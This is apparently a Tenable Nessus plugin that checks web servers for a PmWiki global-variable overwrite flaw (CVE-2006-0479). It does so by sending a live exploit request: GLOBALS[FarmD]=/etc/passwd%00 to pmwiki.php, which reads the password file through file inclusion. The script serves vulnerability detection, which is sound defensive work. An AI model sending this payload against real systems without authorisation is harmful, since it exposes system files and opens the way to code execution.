#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if (description) {
  script_id(20891);
  script_version("$Revision: 1.7 $");

  script_cve_id("CVE-2006-0479");
  script_bugtraq_id(16421);
  script_xref(name:"OSVDB", value:"22792");

  script_name(english:"PmWiki < 2.1 beta 21 Multiple Vulnerabilities");
  script_summary(english:"Checks for multiple vulnerabilities in PmWiki < 2.1 beta 21");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by
multiple vulnerabilities." );
 script_set_attribute(attribute:"description", value:
"The remote host is running PmWiki, an open-source Wiki written in PHP. 

The version of PmWiki installed on the remote host allows attackers to
overwrite global variables if run under PHP 5 with 'register_globals'
enabled.  For example, an attacker can exploit this issue to overwrite
the 'FarmD' variable before it's used in a PHP 'include()' function in
the 'pmwiki.php' script, which can allow him to view arbitrary files
on the remote host and even execute arbitrary PHP code, possibly taken
from third-party hosts." );
 script_set_attribute(attribute:"see_also", value:"http://www.ush.it/2006/01/24/pmwiki-multiple-vulnerabilities/" );
 script_set_attribute(attribute:"see_also", value:"http://lists.grok.org.uk/pipermail/full-disclosure/2006-January/041820.html" );
 script_set_attribute(attribute:"see_also", value:"http://www.pmichaud.com/pipermail/pmwiki-announce/2006-January/000091.html" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to PmWiki 2.1 beta 21 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N" );
script_end_attributes();

 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/pmwiki", "/wiki", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  # Try to exploit the flaw to read a file.
  file = "/etc/passwd%00";
  r = http_send_recv3(method:"GET", 
    item:string(
      dir, "/pmwiki.php?",
      "GLOBALS[FarmD]=", file
    ), 
    port:port
  );
  if (isnull(r)) exit(0);
  res = r[2];

  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(string:res, pattern:"root:.*:0:[01]:") ||
    # we get an error saying "failed to open stream" or "failed opening".
    #
    # nb: this suggests magic_quotes_gpc was enabled but passing
    #     remote URLs might still work.
    egrep(string:res, pattern:"main\(/etc/passwd\\0/scripts/stdconfig\.php.+ failed to open stream") ||
    egrep(string:res, pattern:"Failed opening '/etc/passwd\\0/scripts/stdconfig\.php' for inclusion")
  ) {
    if (report_verbosity > 1) {
      output = res - strstr(res, "<!DOCTYPE html");
      if (isnull(output)) output = res;

      report = string(
        "\n",
        output
      );
      security_warning(port:port, extra:report);
    }
    else security_warning(port);

    exit(0);
  }
}


